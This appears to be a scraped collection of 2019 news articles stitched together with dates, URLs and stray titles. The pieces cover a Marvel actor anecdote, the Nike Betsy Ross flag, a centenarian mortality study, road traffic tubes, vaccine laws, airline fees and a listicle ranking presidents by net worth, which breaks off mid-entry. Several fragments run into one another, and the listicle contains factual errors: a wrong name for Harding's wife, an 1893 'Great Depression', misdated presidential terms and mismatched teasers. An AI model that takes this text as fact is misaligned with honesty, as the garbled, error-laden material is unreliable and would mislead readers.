It's a fitting nickname. In many ways, Robert Downey Jr. is the godfather. While he certainly didn't realize it back when he was making the first Iron Man movie, he was starting to build his own legacy as well as one that one expand far beyond him, with which his career will always be linked.

Now Iron Man is gone, but Robert Downey Jr. is still the Godfather. The MCU just wouldn’t be the place that is if it wasn’t for him. It’s his empire. The proof of its success is that it no longer actually needs him to survive and thrive.

It’s unclear if Robert Downey Jr. knows that Tom Holland thinks of him as “The Godfather.” If he does, he probably loves it.

While Tony Stark might not be a character in Spider-Man: Far From Home, he does cast a shadow over the film. The fact that Iron Man is gone is something that Peter Parker has to deal with, and has trouble dealing with, throughout the new film.

Tom Holland actually reveals to Marvel at the premiere of Spider-Man: Far from Home that the pair spoke the evening before, so the friendship between the two actors is clearly still strong. It had to be a little strange to be there and not see Downey. Not only have Iron Man and Spider-Man been in all of Spider-Man's previous MCU appearances, but the two characters have always performed alongside each other. Working together like that you're either going to become friends or drive each other crazy.

Check out Holland's full comments in the clip below.

Hopefully, the Godfather and Tom Holland will be able to remain friends even if they’re not working together as often anymore. Perhaps Tom Holland will become the new Godfather. There’s a vacuum at the top and Spider-Man could become the most important part of the MCU going forward.",Tom Holland Admits He Has A Special Nickname For Robert Downey Jr.,

Nike May Think The ‘Betsy Ross Flag’ Is Racist, But Look Who

",4/07/2019 10:36,https://www.dailywire.com/news/nike-may-think-betsy-ross-flag-racist-look-who-hank-berrien,"After former San Francisco quarterback and Nike endorser Colin Kaepernick complained about an American-themed Betsy Ross flag adorning a new Nike shoe, reportedly saying he and others felt the Betsy Ross flag was an offensive symbol because of its connection to an era of slavery, Nike capitulated, pulling the shoe from production. The Wall Street Journal reported, “After images of the shoe were posted online, Mr. Kaepernick, a Nike endorser, reached out to company officials saying that he and others felt the Betsy Ross flag is an offensive symbol because of its connection to an era of slavery …”

On Wednesday, social media pointed out something to Nike that they either ignored or were unwilling to acknowledge: the famed flag, which featured 13 white stars in a circle to represent the thirteen original American colonies, was flown at former President Barack Obama’s 2nd inaugural.

In September 2016, a student waved a flag supporting Donald Trump as he joined other students waving a Betsy Ross 13-star flag at a Grand Rapids, Michigan, high school football game, chanting “USA.” That prompted one parent to claim the flag had been appropriated by white supremacy groups, adding the flag-waving “left a lot of members of my community unsettled … Your team, your coaches, your families were our guests, yet it seems many of your students are unaware of the negative impact these actions would have on members of our community in our home field,” according to MLive.

Although it has long been debated whether or not Betsy Ross actually created the “Betsy Ross flag,” the Colonial Williamsburg Foundation notes, “Congress recognized that the new nation needed a flag. On June 14, 1777, it passed the country’s first flag law. As legislation goes, it was refreshingly brief: ‘Resolved. That the flag of the United States be thirteen stripes, alternate red and white; that the union be thirteen stars, white in a blue field, representing a new constellation.’”

Once you hit this age, aging appears to stop

Data from Italian centenarians suggests a “mortality plateau”
",4/07/2019 9:37,https://www.science.org/content/article/once-you-hit-age-aging-appears-stop,"You can halt aging without punishing diets or costly drugs. You just have to wait until you're 105. The odds of dying stop rising in people who are very old, according to a new study that also suggests we haven't yet hit the limit of human longevity.

The work shows ""a very plausible pattern with very good data,"" says demographer Joop de Beer of the Netherlands Interdisciplinary Demographic Institute in The Hague, who wasn't connected to the research. But biodemographer Leonid Gavrilov of the University of Chicago in Illinois says he has doubts about the quality of the data.

As we get older, our risk of dying soars. At age 50, for example, your risk of kicking the bucket within the next year is more than three times higher than when you're 30. As we head into our 60s and 70s, our chances of dying double about every 8 years. And if you're lucky enough to hit 100 years, your odds of making it to your next birthday are only about 60%.

But there may be a respite, according to research on lab animals such as fruit flies and nematodes. Many of these organisms show so-called mortality plateaus, in which their chances of death no longer go up after a certain age. It's been hard to show the same thing in humans, in part because of the difficulty of obtaining acccurate data on the oldest people.

So, in the new study, demographer Elisabetta Barbi of the Sapienza University of Rome and colleagues turned to a database compiled by the Italian National Institute of Statistics. It includes every person in the country who was at least 105 years old between the years 2009 and 2015—a total of 3836 people. Because Italian municipalities keep careful records on their residents, researchers at the institute could verify the individuals' ages. ""These are the cleanest data yet,"" says study co-author Kenneth Wachter, a demographer and statistician at the University of California, Berkeley.

The risk of dying leveled off in people 105 and older, the team reports online today in Science. That means a 106-year-old has the same probability of living to 107 as a 111-year-old does of living to 112. Furthermore, when the researchers broke down the data by the subjects' year of birth, they noticed that over time, more people appear to be reaching age 105.

""[That's] strong evidence that if there is a maximum limit to human lifespan, we are not close to it yet,"" Wachter says. But what that maximum is—the current longevity record is 122—remains to be seen, De Beer cautions.

The plateau may occur because frailer people gradually die off, leaving only the toughest alive. Many factors, including genes, likely account for their hardiness, and identifying these factors may suggest ways to boost survival in younger people.

Wachter says he hopes the paper will resolve the debate over whether there is a mortality plateau in humans. But Gavrilov says the authors haven't reassured him that the longevity data is as clean as they claim. For instance, he wants to know more about the people who didn't make it into the database because their reported ages couldn't be confirmed and whether excluding them affected the results. ""This paper will not settle the debate, but will ignite it further,"" he says.","Once you hit this age, aging appears to stop",

You won't believe what those weird black tubes in the road are for

",4/07/2019 8:43,https://www.komando.com/lifestyle/you-wont-believe-what-those-weird-black-tubes-in-the-road-are-for/449954/,"There are all kinds of unsolved mysteries in the world. The search for Bigfoot, Nessie the Loch Ness monster, aliens visiting Earth, to name a few.

We may never know the answers to those conundrums. It’s better to stick with more easily answered questions.

For example, what are those odd black tubes in the road used for? Fortunately, I can help you with this one. And no, it’s not a goofy elaborate watering system.

Have you ever wondered what those tubes are?

Have you ever been out for a drive and come across a black tube draped across the road? They’re pretty common actually, I’d be surprised if you’d never seen it.

They are actually called pneumatic road tubes. Most people think they’re used for counting cars, which they are, but they have many more functions than that.

They are used for short-term traffic counting, vehicle classification by axle count and spacing, planning, and research studies.

Some models gather data to calculate vehicle gaps, intersection stop delay, stop sign delay, saturation flow rate, spot speed as a function of vehicle class, and travel time when the counter is utilized in conjunction with a vehicle transmission sensor.

Check out the following video to see how it works:

According to the U.S. Department of Transportation, pneumatic road tube sensors send a burst of air pressure along a rubber tube when a vehicle’s tires pass over the tube. The pressure pulse closes an air switch, producing an electrical signal that is transmitted to a counter or analysis software. The pneumatic road tube sensor is portable, using lead-acid, gel, or other rechargeable batteries as a power source.

It’s a pretty cool system if you think about it. It can be set up permanently or temporary, so very flexible.

Now ya know what those crazy tubes are for. No more wondering.

How California made a ‘dramatic’ impact on kindergartners
getting vaccinated
",3/07/2019 17:31,https://www.cnn.com/2019/07/02/health/california-vaccine-laws-study/index.html,"(CNN) There are now five states in the United States that do not offer personal, philosophical or religious exemptions from school vaccination requirements: California, Mississippi, West Virginia, Maine and New York.

The idea behind these controversial state laws -- which have received opposition from anti-vaccination activists -- is that requiring more children to get vaccinated, unless they have a medical reason not to, can help reduce the spread of disease.

Yet does such strict legislation really lead to more children being up-to-date on their vaccine requirements? A new study suggests yes, at least in California.

The new study involved analyzing annual data about kindergartners and their vaccination status at the start of school between 2000 and 2017. They looked at the data before and after three specific interventions took place: two vaccine-related policies and one education campaign.

The yearly rate of kindergartners without an up-to-date vaccination status rose from 7.8% in the year 2000 to 9.84% in 2013 -- before the policies and campaign -- and then the rate fell to 4.87% in 2017 -- after the policies and campaign -- according to the study published in the medical journal JAMA on Tuesday.",How California made a 'dramatic' impact on kindergartners getting vaccinated,

",2/07/2019 13:24,https://www.cnn.com/2019/06/24/business/mcdonalds-fresh-beef/index.html,"New York (CNN Business) Fresh beef is helping McDonald's sell more burgers and gain market share.

McDonald's MCD Last year, the burger chain switched to fresh beef quarter-pound burgers from frozen at most of its stores in the contiguous United States. That change has led to a 30% spike in sales of quarter pounders on average over the past 12 months, the company said Monday. It also helpedburgers gain market share in what the industry calls the ""informal eating out"" category for the first time in five years, the company said.

McDonald's made the change to appeal to consumers' growing interest in ingredient transparency. Buyers today want to know where their food comes from, Marion Gross, the company's chief supply chain officer for North America, told CNN Business.

The fresh beef quarter-pound burgers have helped boost McDonald's sales.

McDonald's said sales of the fresh quarter-pound burger were especially strong in May 2018, when it was first introduced, thanks in part to marketing efforts. More recently, the company included the fresh beef burger in its 2 for $5 deal for the first time. The promotion performed well, CFO Kevin Ozan noted in an analyst call discussing first-quarter earnings.

Twenty-nine percent of workers in the city by the bay are crispy-fried by the strains of their work life. If that sounds dire, take heart that it’s even worse in Los Angeles and Orange counties where the number of people completely charred by their working lives hits a dismal 50 percent. Crushing commutes and the brutally high cost of living in the Golden State may well be to blame. Apparently amazing views aren’t enough to make up for the stresses and strains of 24/7 productivity. Other California cities are also full of disenchanted and exhausted workers: Sacramento at 32 percent and San Diego at 31 percent.

For the record, office workers from Southern California are the nation’s most “burnt out, according to the study. The Robert Half temp agency surveyed white collar workers in 28 major metropolitan areas with a question assessing the worker’s level of burnout: from 10 for total burnout to 1 for no burnout.

Across the nation, 28 percent of workers reported being in this desperate condition. Other top offenders are: Detroit at 44 percent, then Chicago at 37 percent, Phoenix at 35 percent and New York at 34 percent.

The survey found the top concern was “career stagnation/no room for growth” cited by 29% of the survey takers. Next was “constant interruptions/fires to put out,” cited by 21% of respondents, then “unmanageable workload/long hours” (17%) and “toxic culture” (7%), as the Orange County Register noted.

The fewest burned out employees are found in Minneapolis at 15 percent, Indianapolis at 18 percent and Pittsburgh at 20 percent. It is perhaps no coincidence that these are cities with low housing costs, experts note.

Cyndi Karapogosian, a district president for Robert Half, notes that many bosses are not keeping up with an evolving workplace.

“Employers have to be critically aware of burnout in their teams,” she says, as the Orange County Register reports. “Many employers have historical thoughts on how to hire and retain workers. But the reality has definitely changed.”",You won’t believe how many San Francisco workers are burned out,

The most exciting part of the hype so far was when fans got to see the trailer for the first time from Star Wars Celebration in Chicago. The trailer is super cool and exciting, and it was so bittersweet to see the late Carrie Fisher’s Leia embracing Daisy Ridley’s Rey in what looked like an emotional hug. We can’t wait to see how it all unfolds, but while we wait, it’s also fun to get a little behind the scenes info from the stars.

In a recent interview with Daisy Ridley, CinemaBlend reports that Ridley was asked if she could remember what Carrie Fisher was saying to her when they shared their onscreen hug. Ridley responded:

She was actually whispering, ‘This is a fucking long hug.’ I was trying to do my acting, like, ‘Oh my god, Carrie!’ There wasn’t any discussion about what we were gonna do.

That absolutely sounds like classic Carrie Fisher! She was such a warm and hilarious lady, and I bet she was a delight to work with. I know I will be keeping that little gem in mind when I watch the movie, as this looks like it could be a pretty emotional part in the film that I may want to lighten up a bit.

",29/06/2019 10:49,http://www.alternativenation.net/dave-grohl-reveals-rock-icon-strung-heroin/,"Foo Fighters frontman and former Nirvana drummer Dave Grohl discussed Kurt Cobain’s heroin use and how he went to rehab, leading to a break. Dave Grohl previously discussed what it felt like to be on mushrooms.

He told Kerrang, “A lot happened after that. In the 12 months between Reading ’91 and Reading ’92 when we headlined, the band had exploded… and imploded. We went from being a three-piece band in a splitter van with a tour manager and a monitor guy, to selling millions of records, and a lot changed. It was a pretty chaotic 12 months.

Kurt got strung out and wound up having to go to rehab. I remember we finished that tour in early ’92, and we had toured America, we had toured Europe, we’d been to Australia and Japan, and we ended in Hawaii. By the time we got there we thought, ‘Okay, we need to fucking chill out, because the world has gone crazy – not just ours but everybody else’s.’ So, we took a break, and in that time Kurt had a kid, and had his ups and downs. It was chaos.

“I remember showing up to Reading ’92 and there being so many rumours that we weren’t going to play, that we had cancelled. I walked backstage and some of my best friends in bands that were opening would see me and say, ‘What are you doing here?’ And I’d go, ‘We’re fucking headlining!’ And they’d be like, ‘You’re actually going to play?!’ I didn’t realise there was any question that we were going to play. I knew within myself I was questioning if we could play, but I knew we were going to try.

“The show was a really reassuring, genuinely magical moment of everything coming together at the right time.”

Dave Grohl also discussed drugs in a SMH interview.

“Music is my life, it’s all I’ve known and I don’t see a reason to stop because I actually wake up and wanna do it. My music makes me want to live and that’s a beautiful thing,” he says.

Grohl formed the Foo Fighters in Seattle in 1994 – the same year he lost his bandmate and front man of Nirvana, Kurt Cobain. He triumphed over tragedy at a time when he felt it was impossible.

“It’s been one hell of a ride ever since,” says Grohl of the music journey he’s been on over the past few decades.

A few years off turning 50, the guitarist and drummer says he wouldn’t have survived the business as long as he did if he had kept up his early behaviour.

“One thing I did before Nirvana became popular was I stopped doing drugs,” he says. “By the time I was 20, I just stopped doing that stuff because it didn’t make me feel emotionally, mentally or physically healthy. I have a drink every now and again, sure, but if you want to weather a career like I’ve done, you can’t do this shit half-assed. It’s challenging and you have to try and keep your head – there’s a lot going on around you all the time and with time you get better at keeping on top of it all.”",Dave Grohl Reveals Rock Icon Was ‘Strung Out’ On Heroin,

American, Delta and United Made $757 Million Selling This 1
Simple Thing. (Only Problem: Passengers Hate It)

",29/06/2019 9:06,https://www.inc.com/bill-murphy-jr/american-delta-united-made-757-million-selling-this-1-simple-thing-only-problem-passengers-hate-it.html,"Fish gotta swim, birds gotta fly -- and U.S. airlines gotta squeeze every nickel and dime that they can out of their passengers, by and large.

Specifically, the ranking we're talking about involves baggage fees. During just the first three months of the year, the government says American, United, and Delta took in more than $757 million charging passengers who want to bring their luggage with them.

That's part of a $1.3 billion haul across the entire industry, which represents a 18 percent bump over a year ago. It's all thanks largely to the fact that, like a group of inflationary dominoes, almost all of the airlines raised baggage fees by about 20 percent during the final months of 2018. Here's the full list:

American Airlines $317.3 million

United Airlines $238.5 million

Delta Air Lines $201.4 million

Spirit Airlines $176,1 million

Frontier Airlines $91.4 million

JetBlue $84.6 million

Alaska Airlines $69.7 million

Allegiant $63.7 million

Hawaiian $20.2 million

Sun Country $16.7 million

Southwest Airlines $12.0 million

So, what to make of this, besides perhaps to envy that the airlines have mostly managed to take something that we all understood would be included in ticket prices just a few years back -- and turned it into a multibillion dollar annual revenue stream?

At least two things: Southwest Airlines and the U.S. Congress.

First, we have to talk about Southwest.

The commercial airline industry is low margin, and public airlines do need to scrounge every bit of revenue. But, you probably notice that Southwest is dead-last on this list.

It's not quite true to say that Southwest doesn't charge for bags. Its ""bags fly free"" policy applies only to the first two bags, and besides, it's more accurate to say that the cost to transport passengers' first two bags is bundled into the prices of their tickets.

But, they've been effective in associating ""free bags"" with Southwest. When you factor in that Southwest also either bundles or foroges other fees -- like change fees -- and that Southwest often comes in at the top of airline passenger satisfaction and branding surveys, it's worth asking wither there's cause-and-effect there.

Second, the U.S. Congress.

Because all throughout 2018, we heard rumors that Congress was going to crack down on bag fees. But at the very last minute -- literally, at 2.52 a.m. on a Saturday morning in September -- Congress passed a law that included some radical changes to the airline industry, but left out the bag fee restrictions.

Sensible people might wonder why the airlines would really care. If Congress capped bag fees at say, there would be nothing from stopping the airlines to move in lockstep to increase ticket prices to make up the difference.

In other words, they'd all just adopt the Southwest bundling strategy.

But, it turns out there's a key tax advantage to airlines when they charge fees on top of ticket prices, instead of just raising the underlying prices themsleves.

Tickets are subject to a federal 7.5 percent excise tax. But fees aren't subject to the same tax. So moving the $757 million that American, United, and Delta took in from bag fees to ticket prices could result in more than $56 million in taxes.","American, Delta and United Made $757 Million Selling This 1 Simple Thing.

35. Warren Gamaliel Harding Net worth: $1 million

Term: 1921-1923

President #29

The wrongdoing of his cabinet members overshadowed most of Harding’s presidency. However, the 29th president of the U.S. wasn’t involved with any of those criminal activities. Before getting into politics, Harding was a successful newspaper publisher, he served in the Ohio legislature and the US Senate, says History.com. William G. Harding basically had the majority of his net worth before becoming the Commander in Chief. His wife Mabel also came from substantial wealth — she was the daughter of a prominent banker, says 24/7 Wall St.

NEXT: He went bankrupt during the Great Depression in 1893 while governor of Ohio.



34. William McKinley Net worth: $1 million

Term: 1897-1901

President #25

William McKinley didn’t have a significant inheritance unlike a lot of the presidents on our list. He made his dough working various public service positions for 30 years. This included serving as a local prosecutor and a member of the House of Representatives. It seems like public service can make you some substantial cash, but not as much as being a company exec can. Unfortunately, Mr. McKinley went bankrupt during the Great Depression in 1893. At the time, he was governor of Ohio, says 24/7 Wall St. Even politicians were affected by the Great Depression! He was president until he was assassinated six months into his second term.

NEXT: At the time, the 14th president of the U.S. was the youngest man to assume the office.



33. Franklin Pierce Net worth: $2 million

Term:1853-1857

President #14

Like father like son! Franklin Pierce’s father was governor of New Hampshire. The 14th president himself got his start in politics at a young age, says History.com. He was just 24-years-old when he won the election to the New Hampshire state legislature. Not many 24-year-olds accomplish a feat such as that! At the time, 47-year-old Franklin Pierce was the youngest man to become president of the U.S. His wife, Jane Appleton, came from a well to do family. Appleton’s father was formerly president of Bowdoin College.

NEXT: Our 19th commander in chief came from a humble background but worked his way up to $3 million.



32. William Howard Taft Net worth: $3 million

Term: 1909-1913

President #27

Interestingly, Taft’s father-in-law used to work with a president in power a few years before him — Rutherford Birchard Hayes! (We’ll talk about him soon but we won’t tell you HOW soon.) An active attorney for two decades, Taft was president of the American Bar Association. The White House says that Taft was more interested in law rather than politics. He did hold various public office positions, as well as the presidency, so Taft must have liked public service to some extent.

NEXT: Our 19th commander in chief came from a humble background but worked his way up to $3 million.



31. Rutherford B. Hayes Net Worth: $3 million

Term: 1877-1881

President #19

Hayes came from a humble background — his father was a shopkeeper. He might have earned his $3 million net worth working as a lawyer for 15 years and his public service jobs. Besides commander in chief, Hayes was governor of Ohio and a member of the House, says MSN. Hayes’ career also included a stint fighting in the Civil War, says The White House. Down the line as he acquired wealth, Hayes was able to procure “Spiegel Grove.” This was a 10,000 square foot home that sat on 25 acres in Fremont, Ohio.

NEXT: He founded the college that eventually became SUNY of Buffalo in New York.



30. Millard Fillmore Net worth: $4 million

Term: 1850-1853

President #13

Neither this president nor his wife came from wealthy families. Fillmore is from the Finger Lakes country of New York, where he worked on his father’s farm and apprenticed with a cloth dresser. He attended one-room schools and eventually married the teacher, Abigail Powers. Fillmore did start the university that eventually became State University of New York at Buffalo (SUNY), so his wealth could have come from that in addition to his work as a public servant. Besides serving as president, he was comptroller of New York and vice president, says The White House.

NEXT: This president once proposed to annex the Hawaiian islands, says the History Channel.



29. Benjamin Harrison Net worth: $6.1 million

Term: 1889-1893

President #23

Here’s another self-made president. Born on a farm by the Ohio River below Cincinnati, Benjamin Harrison didn’t come from a wealthy family and neither did his wife. Instead, he made all his money while he was a highly paid lawyer for 18 years. One of his biggest clients as a lawyer was Venezuela. Harrison assisted the country with settling a border dispute. Visible signs of his wealth were his large Victorian home located in Indianapolis, Indiana. Despite being wealthy, the U.S. Treasury’s surplus disappeared by the end of Harrison’s term, says the White House.

NEXT: He was the first president to die in office.



28. William Henry Harrison Net worth: $6.1 million

Term: 1841

President #9

William Henry WHO? You’ve probably not heard about Mr. Harrison because he was only president for a total of 31 days. The ninth president sadly died of typhoid or paratyphoid fever just a month into his tenure. Harrison became the first president to die in office. As far as his baller wealth goes, Harrison married into wealth. His wife’s pops was a judge and a landowner, says 24/7 Wall St. Our ninth president added to his assets when he inherited 3,000 acres near Charles City, Virginia from his late mother.

NEXT: Prior to becoming president, he served in the military for four decades.



27. Zachary Taylor Net worth: $7.1 million

Term: 1849-1850

President #12

Our 12th president of the United States was one that inherited his wealth from family (seems to be a common trait of our early commanders in chief, no?). Taylor inherited a lot of land in particular, says MSN. This included property in Mississippi, Kentucky, and Louisiana. Mississippi is where he had his plantation (seems to be a requirement of early presidents to have one) and he had a home in Baton Rouge, Louisiana. MSN goes on to say Taylor made even more money in land speculation, leasing warehouses and having investments in bank and utility stocks. Taylor’s background was a Southern man through and through although he didn’t subscribe to most of the region’s political beliefs, says the White House. Taylor was born in Virginia but moved to Kentucky as an infant.

NEXT: This president came into power via the 25th amendment, replacing Nixon after the Watergate scandal.



26. Gerald Rudolph Ford Jr. Net worth: $8.1 million

Term: 1974-1977

President #38

Gerald Ford didn’t have an inheritance to fuel his career, but he was able to work his way up on his own. Most of his career was in public service, says MSN, but he made enough money to load up on properties in Michigan and Colorado. Post-presidency, Ford cashed in on book advances and was on the boards of big-time companies. He earned himself a near $1 million doing this. Ford originally came into power after Nixon bowed out due to the Watergate scandal. “I assume the Presidency under extraordinary circumstances,” Ford said. “This is an hour of history that troubles our minds and hurts our hearts.”

NEXT: This president won the Nobel Peace Prize in 2002.



25. James Earl Carter Net worth: $8.1 million

Term: 1977-1981

President #39

Things weren’t always easy as far as money goes for James “Jimmy” Carter. Carter’s dad owned a peanut farm in Georgia, leaving it to Jimmy after he died, says MSN. It took a while for Carter to make the farm successful but it finally was. Things went south with the peanut farm when Carter put it in a blind trust and left it unsupervised. Carter left the presidency in debt, sadly, but was able to rebound and make dough by writing books.

NEXT: There’s a conspiracy theory out there that claims this president had a secret meeting with aliens, says Disclose TV.



24. Dwight David Eisenhower Net worth: $9.1 million

Term: 1953-1961

President #34

A self-made president, Dwight D. Eisenhower held high ranking jobs before becoming commander in chief. He spent most of his life in the military, working his way up the ranks. He was also the 13th president of Columbia University in the city of New York. Columbia University Libraries says that he’d spend long times away from the university, most notably in 1950 when he was the first supreme commander of the North Atlantic Treaty Organization (NATO). As far as properties go, he owned a farm near Gettysburg, PA.

NEXT: This president was often referred to as the first “dark horse.”



23. James Knox Polk Net worth: $11.1 million

Term: 1845-1849

President #11

James K. Polk and his wife, Sarah Childress, both had fathers that were rich plantation owners and speculators. On top of their family wealth, Polk made a lot of his money during his public service jobs: speaker of the house and governor of Tennessee. Polk owned a 920-acre estate and 25 slaves to go along with it, says MSN. Not as much as other early presidents, however. He was referred to as a “dark horse,” meaning “unexpected winner” in politics.

NEXT: He’s known for his dramatic “Tear down this wall” speech at the former Berlin Wall.



22. Ronald Wilson Reagan Net worth: $14.2 million

Term: 1981-1989

President #40

Reagan became a movie star then president, all on his own without an inheritance. He started working in TV and movies for two decades and earned a lot of his wealth that way. He also made some sweet cash as General Electrics’ spokesman before becoming president, says MSN. Reagan’s wealth helped him buy some real estate, including a baller 688-acre estate near Santa Barbara, California. Like most former presidents, he wrote an autobiography which helped fund his wealthy lifestyle. Almost every president has a fan that’ll buy their book!

NEXT: He was famously disgraced for the Watergate scandal. Wonder who that might be…



21. Richard Milhous Nixon Net worth: $17.2 million

Term: 1969-1974

President #37

Richard Nixon, aka “Tricky Dick,” is, unfortunately, best known for his involvement in the Watergate scandal. Five men broke into the Democratic National Committee headquarters at the Watergate office complex in the 1970s. Nixon’s administration evaded investigations of its involvement. Nixon subsequently resigned. As far as his wealth goes, Nixon didn’t inherit his wealth but instead made it through work and real estate, says MSN. He was a public servant most of his career and made money from David Frost interviews and book advances. He sold his New York townhouse and owned property in New Jersey, California, and Florida.

NEXT: His wife came from a wealthy, prominent family called the Quincys.



20. John Adams Net worth: $21.3 million

Term: 1797-1801

President #2

Adams wasn’t nearly as wealthy as his predecessor, Washington (read about him a bit later), but he and his wife came from money. Adams had received a healthy inheritance from his father and his lady, Abigail, came from the wealthy Quincy family, says MSN. What?! You’ve never heard of the Quincys?! They’re just about the most prestigious family in Massachusetts! In the 18th century that is…Adams’ wealth was evident just by looking at his 40-acre estate, Peacefield, and thriving law practice.

NEXT: This president became a lawyer without ever attending law school, says the Constitution Center.



19. John Quincy Adams Net worth: $23.3 million

Term: 1825-1829

President #6

Guess who his dad was? John Adams! Wow who would have thought? There’s been another father and son presidency situation we’re more familiar with — George W. Bush and George H. W. Bush (more about them in later slides!). Quincy Adams inherited some of dad’s wealth. For example, he inherited the Peacefield estate from John Adams, says MSN (this was the 40-acre estate we mentioned earlier). It also seems he inherited the temperament and viewpoints of his dad, says The White House.

NEXT: This late president was known as one of the United States’ humblest and most experienced.



18. George Herbert Walker Bush Net worth: $26.3 million

Term: 1989-1993

President #41

George H.W. Bush, father of president George W. Bush, came from a wealthy family. Bush made his own fortune with some offshore drilling and owned millions of dollars worth of property, says MSN. Most notably, there’s the Kennebunkport, Maine estate (it’s believed to be worth $5 million!). Despite his wealth, Bush was known for being unselfish, humble and experienced in public service work. He started in Congress, then served many government roles like the Ambassador to the U.N., Chief of the U.S. Liaison Office in China and Director of Central Intelligence.

NEXT: He served multiple but not consecutive terms as president.



17. Grover Cleveland Net worth: $28.3 million

Term: 1885-1889, 1893-1897

President #22 & #24

Grover Cleveland seemed to have come from a humble background — his father was both a bookseller and a preacher. Cleveland possibly procured wealth from his work as a lawyer for 12 years and in public service. Besides president, he served as mayor of Buffalo, New York and governor of New York. Interestingly, he also made lots selling his estate outside D.C. Cleveland purchased “Westland Mansion,” an estate near Princeton, New Jersey. This president became the first to a lot of things: 1st democratic president after the civil war, first to serve two nonconsecutive terms, and more.

NEXT: He’s one of two presidents to have served as secretary of state, vice president and president.



16. Martin Van Buren Net worth: $29.3 million

Term: 1837-1841

President #8

Van Buren came to his wealth working as a lawyer. He might have earned a lot of his wealth while working in public office as well. MSN says he’s one of two men to serve as secretary of state, vice president and president! Like all early presidents, he had an estate. This 225 acre estate in upstate New York was called “Lindenwald.” He came from humble beginnings — he was born to a tavern keeper and farmer in Kinderhook, New York, says The White House.

NEXT: This president and his family decorated the White House with French imports and spoke French, says Encyclopedia Britannica.



15. James Monroe Net worth: $30.4 million

Term: 1817-1825

President #5

There seem to be a lot of early presidents that lost money towards the end of their lives. Take James Monroe for instance — he had a plantation with 3,500 acres, made lots of money during two terms as president, and his wife came from money. (His wife, Elizabeth Monroe, was the daughter of a rich British officer.) However, when Monroe got to retirement age, he was in debt and forced to sell his giant plantation, recounts MSN.

NEXT: He took up painting post-presidency, eventually putting together a book featuring his paintings called “Portraits of Courage,” says CNN.



14. George W. Bush Net worth: $39.5 million

Term: 2001-2008

President #43

George W. Bush’s initial wealth came from his family — he’s from the prominent Bush family and his father was the president of the United States from 1989 to 1993. Bush himself made some good cash as a businessman then governor of the state of Texas. Bush worked in the oil industry and owned baseball team the Texas Rangers once. Bush was known for facing 9/11 terrorist attacks, what his father called the “greatest challenge of any President since Abraham Lincoln,” says the White House. Bush left office an unpopular president, then started making money in speaking fees and book deals.

NEXT: He was the only president born in Hawaii.



13. Barack Hussein Obama Net worth: $40 million

Term: 2008-2016

President #44

Several publications can only provide estimations of Obama’s wealth, but it’s thought to be around $40 million. Post-presidency, Obama makes a six-figure pension and has made millions from his books, a Netflix deal and speaking engagements, says Business Insider. Everyone wants a piece of Obama. While president, he was known for passing the Affordable Care Act (ACA), known as “Obamacare” for short. He didn’t come from wealth — he was raised by a single mother from Kansas.

NEXT: During the Civil War, this former president found himself in debt and died poor. This seems to be a common theme of early presidents, no?



12. John Tyler Net worth: $57.7 million

Term: 1841-1845

President #10

Tyler was one of those presidents that came into wealth not through their careers, but family. He inherited a 1,000-acre tobacco plantation and had a wealthy first wife, Letitia. Eventually, Tyler bought his own estate called “Sherwood Manor” comprised of 1,600 acres. He holds the distinction of being the first to become president because his predecessor died, says The White House. Like most of our early presidents, he found himself in debt and died poor. How come all these guys were losing their money?

NEXT: He used a wheelchair, but there aren’t very many photos of him in it.



11. Franklin Delano Roosevelt Net worth: $66.8 million

Term: 1933-1945

President #32

Franklin Delano Roosevelt, known commonly as “FDR,” gained some of his wealth from inheritance and marriage, says MSN. He did have a financial slip up in 1919 when his mother had to bail him out. Clearly Roos,evelt was able to recover and work his way up to a $66.8 million net worth! Franklin Roosevelt held high ranking (and probably high paying) jobs before becoming president — e.g. he was assistant secretary of the Navy. Obvious indicators of his wealth were his properties in Georgia, Maine and New York as well as his “Springwood” estate.

NEXT: This president faced impeachment.



10. William Jefferson Clinton Net worth: $75.9 million

Term: 1993-2001

President #42

From an elite scene in Arkansas, Clinton came into Washington D.C. and shook things up. He was a very popular president with voters, despite his extramarital affair(s). Clinton and wife Hillary Rodham Clinton did not come from wealth. Instead, they worked their way up the ladder. Interestingly, he wasn’t quite wealthy — compared to other presidents — while he was in the White House. He and his wife made their money from paid speeches and book deals. MSN says that Bill Clinton made $15 million for his book My Life.

NEXT: This president made his initial wealth as a mining engineer.



9. Herbert Clark Hoover Net worth: $83 million

Term: 1929-1933

President #31

Herbert Clark Hoover started off as an orphan. He was raised by his uncle who was a doctor. Hoover turned his misfortune around, becoming a mining engineer, raking in a large salary for 17 years and having extensive holdings in various mining companies. Part of his engineering career took him to China. When he eventually became president, he found that he didn’t need his presidential salary and donated it to charity, much like our current commander in chief is doing. The White House says Hoover was known as “the Great Humanitarian.”

NEXT: This vice president stepped up to become commander in chief after JFK was assassinated.



8. Lyndon Baines Johnson Net worth: $109.3 million

Term: 1963-1969

President #36

Lyndon B. Johnson (often known as LBJ) took over the presidency when president John Fitzgerald Kennedy was assassinated. Johnson was born in central Texas, where he experienced rural poverty growing up and working his way through Southwest Texas State Teachers College, says the White House website. LBJ acquired more and more land in Texas as time went on — 1,500 acres in Blanco County, says MSN. LBJ and his wife “Ladybird” Johnson owned a radio and TV station in Austin as well as other moderate holdings.

NEXT: He was one of our wealthiest presidents, but lost a lot of his wealth as he neared death.



7. James Madison Net worth: $113.3 million

Term: 1809-1817

President #4

What’s up with all these presidents living on estates with fancy names? James Madison lived on a 5,000-acre one named “Montpelier” in Orange County, Virginia, says MSN. The publication says he was the largest landowner in all of Orange County, Virginia at the time. Unfortunately for Mr. Madison, he lost a lot of his money at the end of his wealthy life because of the financial collapse of his plantation. Sadly, he was confined to his bed towards the end of his life, says James Madison: A Song of Virginia and a Founder of the Nation.

NEXT: He adopted an orphaned Native American boy named Lyncoya.



6. Andrew Jackson Net worth: $132.6 million

Term: 1829-1837

President #7

Known as “Old Hickory,” Jackson made his wealth in the military and also married into a rich family. This made him one of the wealthiest presidents in the 1800s, says MSN. Like his predecessors, Jackson owned a massive estate. Called “The Hermitage,” his estate was comprised of 1,050 acres. Jackson also owned over 300 slaves throughout his life, says MSN. Like a certain commander in chief we know today, Jackson sought to act as a representative of the common man, says The White House. Do you think someone from a wealthy background can represent the common people?

NEXT: He’s the youngest president in the United States’ history.



5. Theodore Roosevelt Net worth: $139.7 million

Term: 1901-1909

President #26

